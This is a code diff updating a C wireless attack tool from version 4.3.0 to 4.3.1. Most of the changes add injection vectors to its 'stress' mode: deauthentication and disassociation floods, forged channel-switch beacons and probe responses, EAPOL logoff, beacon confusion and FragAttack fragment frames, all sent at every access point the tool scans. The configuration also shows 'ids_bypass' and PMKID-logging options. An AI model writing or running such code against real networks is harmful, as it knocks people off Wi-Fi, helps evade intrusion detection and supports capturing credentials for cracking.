@@ -126,7 +126,7 @@ static const char *BANNER =
  *               CONSTANTS
  * ============================================================ */
 
-#define VERSION "4.3.0"
+#define VERSION "4.3.1"
 #define MAX_SSID_LEN 32
 #define MAX_MAC_STR 18
 #define MAX_IFACE 32
@@ -215,6 +215,17 @@ typedef struct {
   double refresh_rate;
   char stats_file[MAX_PATH_LEN];
 } config_t;
+
+typedef struct {
+  char iface[MAX_IFACE];
+  attack_mode_t mode;
+  bool vec_on[VEC_COUNT];
+  int nvec;
+  bool scan_5ghz;
+  int duration;
+} stress_cfg_t;
+
+static void run_stress(stress_cfg_t *cfg);
 
 /* [FIX 4] Lock-free atomic counters */
 static atomic_uint_fast64_t g_pkts_sent = 0;
@@ -1919,14 +1930,14 @@ static int scan_aps(const char *iface, int dur, target_ap_t *aps, int max,
     if (!essid[0])
       continue;
 
-    snprintf(aps[cnt].bssid, MAX_MAC_STR, "%s", fld[0]);
-    snprintf(aps[cnt].ssid, MAX_SSID_LEN + 1, "%s", essid);
+    snprintf(aps[cnt].bssid, MAX_MAC_STR, "%.17s", fld[0]);
+    snprintf(aps[cnt].ssid, MAX_SSID_LEN + 1, "%.32s", essid);
     aps[cnt].channel = nf > 3 ? atoi(fld[3]) : 1;
     if (aps[cnt].channel < 1)
       aps[cnt].channel = 1;
     aps[cnt].power = nf > 8 ? atoi(fld[8]) : -100;
     if (nf > 5)
-      snprintf(aps[cnt].encryption, 16, "%s", fld[5]);
+      snprintf(aps[cnt].encryption, 16, "%.15s", fld[5]);
     cnt++;
   }
   fclose(fp);
@@ -2083,7 +2094,7 @@ static void input_prompt(const char *prompt, char *out, int sz,
       printf("     " C_RED "✗ %s" RST "\n", err);
       continue;
     }
-    snprintf(out, sz, "%s", p);
+    snprintf(out, (size_t)sz, "%.*s", sz - 1, p);
     return;
   }
 }
@@ -2147,7 +2158,7 @@ static void menu_target(const char *iface, target_ap_t *t) {
       while (*p == ' ')
         p++;
       if (*p)
-        snprintf(band, sizeof(band), "%s", p);
+        snprintf(band, sizeof(band), "%.7s", p);
     }
 
     int dur = (strcmp(band, "a") == 0 || strcmp(band, "abg") == 0) ? 15 : 10;
@@ -2447,6 +2458,46 @@ static void run_script(const char *path) {
   jstr(j, "stats_file", cfg.stats_file, MAX_PATH_LEN);
   jstr(j, "iface2", cfg.iface2, MAX_IFACE);
 
+  bool script_stress = false, script_5ghz = false;
+  jbool(j, "stress_mode", &script_stress);
+  jbool(j, "scan_5ghz", &script_5ghz);
+
+  if (script_stress) {
+    stress_cfg_t scfg = {0};
+    snprintf(scfg.iface, MAX_IFACE, "%.31s", cfg.iface);
+    scfg.scan_5ghz = script_5ghz;
+    scfg.duration = cfg.duration;
+    scfg.mode = MODE_MEDIUM;
+
+    char ms[32];
+    if (jstr(j, "mode", ms, sizeof(ms))) {
+      for (char *p = ms; *p; p++)
+        *p = toupper(*p);
+      for (int i = 1; i <= 5; i++)
+        if (strcmp(ms, MODE_NAMES[i]) == 0)
+          scfg.mode = (attack_mode_t)i;
+    }
+
+    char vn[VEC_COUNT][64];
+    int nv = jarr(j, "vectors", vn, VEC_COUNT);
+    for (int i = 0; i < nv; i++)
+      for (int v = 0; v < VEC_COUNT; v++)
+        if (strcmp(vn[i], VEC_NAMES[v]) == 0) {
+          scfg.vec_on[v] = true;
+          scfg.nvec++;
+        }
+    if (!scfg.nvec) {
+      scfg.vec_on[VEC_DEAUTH_FLOOD] = true;
+      scfg.vec_on[VEC_DISASSOC_FLOOD] = true;
+      scfg.vec_on[VEC_CSA_BEACON] = true;
+      scfg.vec_on[VEC_AUTH_DOS] = true;
+      scfg.nvec = 4;
+    }
+    free(j);
+    run_stress(&scfg);
+    return;
+  }
+
   /* [FIX 32] Boolean options from JSON */
   jbool(j, "log_pmkid", &cfg.log_pmkid);
   jbool(j, "ids_bypass", &cfg.ids_bypass);
@@ -2609,7 +2660,7 @@ typedef struct {
   int channel;
   int8_t rssi;
   double last_seen;
-  _Atomic uint64_t tx_count;
+  uint64_t tx_count;
 } stress_ap_t;
 
 typedef struct {
@@ -2617,15 +2668,6 @@ typedef struct {
   int count;
   pthread_mutex_t lock;
 } stress_pool_t;
-
-typedef struct {
-  char iface[MAX_IFACE];
-  attack_mode_t mode;
-  bool vec_on[VEC_COUNT];
-  int nvec;
-  bool scan_5ghz;
-  int duration;
-} stress_cfg_t;
 
 /* Global stress state */
 static _Atomic int g_stress_ch = 0;
@@ -2646,7 +2688,7 @@ static void stress_pool_add(stress_pool_t *p, const uint8_t bssid[6],
       p->aps[i].last_seen = mono_time();
       p->aps[i].channel = channel;
       if (ssid[0] && !p->aps[i].ssid[0])
-        snprintf(p->aps[i].ssid, MAX_SSID_LEN + 1, "%s", ssid);
+        snprintf(p->aps[i].ssid, MAX_SSID_LEN + 1, "%.32s", ssid);
       pthread_mutex_unlock(&p->lock);
       return;
     }
@@ -2657,11 +2699,11 @@ static void stress_pool_add(stress_pool_t *p, const uint8_t bssid[6],
     stress_ap_t *a = &p->aps[p->count];
     memcpy(a->bssid, bssid, 6);
     format_mac(bssid, a->bssid_str);
-    snprintf(a->ssid, MAX_SSID_LEN + 1, "%s", ssid);
+    snprintf(a->ssid, MAX_SSID_LEN + 1, "%.32s", ssid);
     a->channel = channel;
     a->rssi = 0;
     a->last_seen = mono_time();
-    atomic_store(&a->tx_count, 0);
+    a->tx_count = 0;
     p->count++;
     atomic_store(&g_stress_aps_seen, p->count);
   }
@@ -2730,7 +2772,7 @@ static void *stress_scanner_thread(void *arg) {
     uint16_t rt_len = 0;
     memcpy(&rt_len, buf + 2, 2);
     rt_len = le16toh(rt_len);
-    if (rt_len + (int)sizeof(dot11_t) > n)
+    if (rt_len < 8 || (size_t)rt_len + sizeof(dot11_t) > (size_t)n)
       continue;
 
     /* Check if this is a Beacon (type=0, subtype=8) */
@@ -2937,6 +2979,18 @@ static void *stress_injector_thread(void *arg) {
         }
       }
 
+      if (a->cfg->vec_on[VEC_EAPOL_LOGOFF]) {
+        uint8_t fake_cli[6];
+        rand_mac(fake_cli);
+        len = mk_eapol_logoff(tmp, bss, fake_cli);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+      }
+
       if (a->cfg->vec_on[VEC_CSA_BEACON]) {
         /* CSA beacon: redirect to a random adjacent channel */
         int redir =
@@ -2946,6 +3000,33 @@ static void *stress_injector_thread(void *arg) {
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
         len = mk_csa_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel,
                             (uint8_t)redir);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+      }
+
+      if (a->cfg->vec_on[VEC_BEACON_CONFUSION]) {
+        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
+        len = mk_confusion_beacon(tmp, ssid, (uint8_t)snap[i].channel);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+      }
+
+      if (a->cfg->vec_on[VEC_PROBE_RESPONSE_CSA]) {
+        int redir =
+            snap[i].channel < 10 ? snap[i].channel + 3 : snap[i].channel - 3;
+        if (redir < 1)
+          redir = 11;
+        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
+        len = mk_probe_resp_csa(tmp, bss, BCAST, ssid, (uint8_t)snap[i].channel,
+                                (uint8_t)redir);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
@@ -3002,12 +3083,33 @@ static void *stress_injector_thread(void *arg) {
         }
       }
 
+      if (a->cfg->vec_on[VEC_FRAGATTACK]) {
+        uint8_t fake_cli[6];
+        rand_mac(fake_cli);
+        uint16_t fseq = (uint16_t)(xs64_next(&rng) % 4096);
+        int len0 = mk_frag_setup(tmp, bss, fake_cli, fseq);
+        uint8_t tmp1[MAX_PKT_SIZE];
+        int len1 = mk_frag_payload(tmp1, bss, fake_cli, fseq, NULL, 0);
+
+        if (inject_one(sock, tmp, len0) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+        if (inject_one(sock, tmp1, len1) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+      }
+
       /* Update per-AP counter */
-      /* Find original in pool and update */
       pthread_mutex_lock(&a->pool->lock);
       for (int j = 0; j < a->pool->count; j++) {
         if (memcmp(a->pool->aps[j].bssid, bss, 6) == 0) {
-          atomic_fetch_add(&a->pool->aps[j].tx_count, (uint64_t)sent_for_ap);
+          a->pool->aps[j].tx_count += (uint64_t)sent_for_ap;
           break;
         }
       }
@@ -3118,7 +3220,7 @@ static void *stress_display_thread(void *arg) {
     int show = nsnap > max_rows ? max_rows : nsnap;
 
     for (int i = 0; i < show; i++) {
-      uint64_t atx = atomic_load(&snap[i].tx_count);
+      uint64_t atx = snap[i].tx_count;
       char ssid_disp[48];
       if (snap[i].ssid[0]) {
         snprintf(ssid_disp, sizeof(ssid_disp), "%.18s", snap[i].ssid);
@@ -3156,6 +3258,8 @@ static void *stress_display_thread(void *arg) {
     usleep_precise(0.15);
   }
 
+  printf("\033[?25h");
+  fflush(stdout);
   free(d);
   return NULL;
 }
@@ -3203,6 +3307,8 @@ static void run_stress(stress_cfg_t *cfg) {
   stress_pool_t pool;
   stress_pool_init(&pool);
 
+  g_stop = 0;
+  g_stress_aps_seen = 0;
   g_start_time = mono_time();
   g_pkts_sent = 0;
   g_pkts_fail = 0;
